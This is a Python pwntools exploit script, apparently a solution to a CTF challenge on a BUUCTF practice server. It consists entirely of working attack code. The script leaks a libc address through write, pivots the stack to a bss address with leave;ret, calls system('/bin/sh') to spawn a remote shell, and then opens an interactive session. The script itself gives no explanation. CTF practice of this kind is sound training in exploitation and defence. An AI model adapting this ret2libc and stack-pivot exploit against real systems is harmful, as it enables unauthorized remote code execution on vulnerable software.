from pwn import *
from LibcSearcher import *
context.terminal=['tmux','splitw','-h']
context(os='linux', arch='i386', kernel='i386',log_level='debug')
#io=gdb.debug('./pwn')
#io=process('./pwn')
io=remote('node4.buuoj.cn',28038)

#node4.buuoj.cn:28038
s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil
ii=io.interactive

#gdb.attach(io,'''
#            b main
#            b vul_function
#''')
#pause()

#shell=shellcode=asm(shellcraft.sh())

elf=ELF('./pwn')
libc=ELF('./libc-2.23.so')
#libc=ELF('./libc-2.23_sym.so')
puts=elf.got['puts']

write_addr=elf.got['write']
write=elf.plt['write']
#ret=
leave=0x8048511
main=0x8048513   #elf.plt['main']

payload1=b'Tebp'+p32(write)+p32(main)+p32(1)+p32(write_addr)+p32(4)
ru(b'What is your name?')
sl(payload1)

ru(b'What do you want to say?')


bass=0x804A300
payload2=b'a'*(0x18)+p32(bass)+p32(leave) #+p32(main)+p32(1)+p32(write_addr)+p32(4)

s(payload2)


#addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
#ru(b'0x')
#addr=u32(io.recvuntil(b'\xf7')[-4:])
addr=u32(r(4))
#rbp= int(io.recv(12).rjust(16,b'0'),16)
#print(hex(rbp))

#libc=LibcSearcher('write',addr)
#libc_base_addr=addr-libc.dump('write')
#system_addr=libc_base_addr+libc.dump('system')
#bin_sh_addr=libc_base_addr+libc.dump('str_bin_sh')
print(hex(addr))
libc_base_addr=addr-libc.sym['write']
system_addr=libc_base_addr+ libc.sym['system']    
bin_sh_addr=libc_base_addr+ next(libc.search(b'/bin/sh\x00'))

print(hex(system_addr))



payload3=b'Tebp'+p32(system_addr)+b'aaaa'+p32(bin_sh_addr)  #+p32(1)+p32(write_addr)+p32(4)
ru(b'What is your name?')
sl(payload3)



ru(b'What do you want to say?')



payload4=b'a'*(0x18)+p32(bass)+p32(leave)  #+p32(1)+p32(write_addr)+p32(4)

s(payload4)

ii()
